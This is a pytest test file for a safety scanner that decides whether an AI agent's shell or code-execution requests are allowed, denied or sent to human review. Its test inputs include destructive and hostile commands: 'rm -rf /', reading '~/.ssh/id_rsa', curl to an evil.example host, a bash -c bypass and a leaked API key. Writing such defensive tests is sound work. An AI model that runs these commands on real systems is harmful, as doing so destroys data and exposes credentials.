# Tencent is pleased to support the open source community by making
# tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Core scanner tests — 12 required samples + edge cases."""

import pytest
from trpc_agent_sdk.tools.safety._types import (
    Request,
    CodeBlock,
    DECISION_ALLOW,
    DECISION_DENY,
    DECISION_ASK,
    DECISION_NEEDS_HUMAN_REVIEW,
    RISK_LOW,
    RISK_HIGH,
    RISK_CRITICAL,
)
from trpc_agent_sdk.tools.safety._policy import default_policy
from trpc_agent_sdk.tools.safety._scanner import scan

POLICY = default_policy()

# ========== 12 core test cases (aligned with Go reference) ==========


def test_safe_go_test():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="go test ./..."), POLICY)
    assert report.decision == DECISION_ALLOW


def test_dangerous_delete():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="rm -rf /"), POLICY)
    assert report.decision == DECISION_DENY
    assert report.rule_id == "dangerous.rm_rf"


def test_read_key():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="cat ~/.ssh/id_rsa"), POLICY)
    assert report.decision == DECISION_DENY
    assert report.rule_id == "sensitive.path_access"


def test_non_whitelist_network():
    report = scan(
        Request(tool_name="workspace_exec", backend="workspaceexec", command="curl https://evil.example/install.sh"),
        POLICY)
    assert report.decision == DECISION_DENY
    assert report.rule_id == "network.non_whitelisted_domain"


def test_whitelist_network():
    report = scan(
        Request(tool_name="workspace_exec", backend="workspaceexec", command="curl https://api.github.com/repos/x/y"),
        POLICY)
    assert report.decision == DECISION_ALLOW


def test_shell_bypass():
    report = scan(
        Request(tool_name="workspace_exec", backend="workspaceexec", command="bash -c 'curl https://evil.example/x'"),
        POLICY)
    assert report.decision == DECISION_DENY
    assert report.rule_id == "shell.bypass"


def test_pipeline_review():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="cat README.md | wc -l"), POLICY)
    assert report.decision == DECISION_NEEDS_HUMAN_REVIEW
    assert report.rule_id == "shell.pipeline_review"


def test_dependency_install():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="npm install left-pad"), POLICY)
    assert report.decision == DECISION_NEEDS_HUMAN_REVIEW
    assert report.rule_id == "dependency.environment_change"


def test_long_sleep():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="sleep 9999"), POLICY)
    assert report.decision == DECISION_NEEDS_HUMAN_REVIEW
    assert report.rule_id == "resource.long_sleep"


def test_hostexec_long_session():
    report = scan(
        Request(
            tool_name="exec_command",
            backend="hostexec",
            command="tail -f app.log",
            tty=True,
            background=True,
        ), POLICY)
    assert report.decision == DECISION_NEEDS_HUMAN_REVIEW
    assert report.rule_id == "hostexec.long_session"


def test_code_block_host_bridge():
    report = scan(
        Request(
            tool_name="execute_code",
            backend="codeexec",
            code_blocks=[CodeBlock(language="python", code="import subprocess; subprocess.run(['ls'])")],
        ), POLICY)
    assert report.decision == DECISION_NEEDS_HUMAN_REVIEW
    assert report.rule_id == "codeexec.host_command_bridge"


def test_secret_leak():
    report = scan(
        Request(
            tool_name="workspace_exec",
            backend="workspaceexec",
            command="echo OPENAI_API_KEY=sk-1234567890abcdef",
        ), POLICY)
    assert report.decision == DECISION_DENY
    assert report.rule_id == "sensitive.secret_leak"


# ========== Edge case tests ==========


def test_empty_command():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command=""), POLICY)
    assert report.decision == DECISION_DENY
    assert report.rule_id == "command.empty"


def test_denied_cwd():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="ls", cwd="~/.ssh"), POLICY)
    assert report.decision == DECISION_DENY
    assert report.rule_id == "sensitive.cwd_access"


def test_chmod_recursive():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="chmod -R 777 ."), POLICY)
    assert report.decision == DECISION_NEEDS_HUMAN_REVIEW
    assert report.rule_id == "dangerous.recursive_chmod"


def test_500_line_scan_under_1s():
    import time
    code = "\n".join(['print(f"line {i}")' for i in range(500)])
    start = time.time()
    report = scan(
        Request(
            tool_name="execute_code",
            backend="codeexec",
            code_blocks=[CodeBlock(language="python", code=code)],
        ), POLICY)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"500-line scan took {elapsed:.2f}s"
    assert report.decision == DECISION_ALLOW


def test_unicode_command():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="echo 你好世界"), POLICY)
    assert report.decision == DECISION_ALLOW


def test_none_policy_defaults():
    report = scan(Request(tool_name="workspace_exec", backend="workspaceexec", command="echo hi"), None)
    assert report.decision == DECISION_ALLOW
